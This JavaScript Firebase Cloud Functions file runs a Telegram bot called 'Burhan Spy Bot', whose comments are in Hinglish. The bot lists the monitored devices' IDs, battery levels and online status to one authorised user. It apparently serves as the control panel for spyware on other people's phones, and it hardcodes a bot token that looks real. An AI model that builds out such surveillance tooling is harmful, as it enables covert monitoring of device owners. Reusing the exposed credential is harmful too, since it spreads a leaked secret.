const functions = require("firebase-functions");
const admin = require("firebase-admin");
const TelegramBot = require("node-telegram-bot-api");

admin.initializeApp();

const db = admin.database();

// 🔥 APNA BOT TOKEN YAHAN DAALO
const token = "8811118034:AAEFtRZ5vsk3n8YlXvUrE0csOVNdlsh7IzM";
const YOUR_USER_ID = 2062068620;
const bot = new TelegramBot(token, { polling: false });

// Ye function Telegram ka naya message aane par chalega
exports.telegramWebhook = functions.https.onRequest((req, res) => {
  bot.processUpdate(req.body);
  res.status(200).send("OK");
});

// 🔥 JAB BOT SHURU HOGA (DEPLOY HOGA) TOH WEBHOOK SET KARENGE
exports.setWebhook = functions.https.onRequest(async (req, res) => {
  await bot.setWebHook(`https://${process.env.GCLOUD_REGION}-${process.env.PROJECT_ID}.cloudfunctions.net/telegramWebhook`);
  res.status(200).send("Webhook set kiya!");
});

// ✅ START COMMAND
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  if (msg.from.id !== YOUR_USER_ID) return bot.sendMessage(chatId, "⛔ Access Denied!");
  bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n/devices - Saare devices dekho\n/stats - Total count`);
});

// ✅ DEVICES COMMAND
bot.onText(/\/devices/, (msg) => {
  const chatId = msg.chat.id;
  if (msg.from.id !== YOUR_USER_ID) return bot.sendMessage(chatId, "⛔ Access Denied!");

  db.ref("devices").once("value", (snapshot) => {
    const devices = snapshot.val() || {};
    let message = "📱 ALL DEVICES (Total: " + Object.keys(devices).length + ")\n\n";
    Object.entries(devices).forEach(([id, d]) => {
      message += `🔑 ID: ${id}\n🔋 Battery: ${d.battery}%\n📊 Status: ${d.online ? "🟢 ONLINE" : "🔴 OFFLINE"}\n\n`;
    });
    bot.sendMessage(chatId, message);
  });
});

// ✅ STATS COMMAND
bot.onText(/\/stats/, (msg) => {
  const chatId = msg.chat.id;
  if (msg.from.id !== YOUR_USER_ID) return bot.sendMessage(chatId, "⛔ Access Denied!");

  db.ref("devices").once("value", (snapshot) => {
    const devices = snapshot.val() || {};
    bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
  });
});
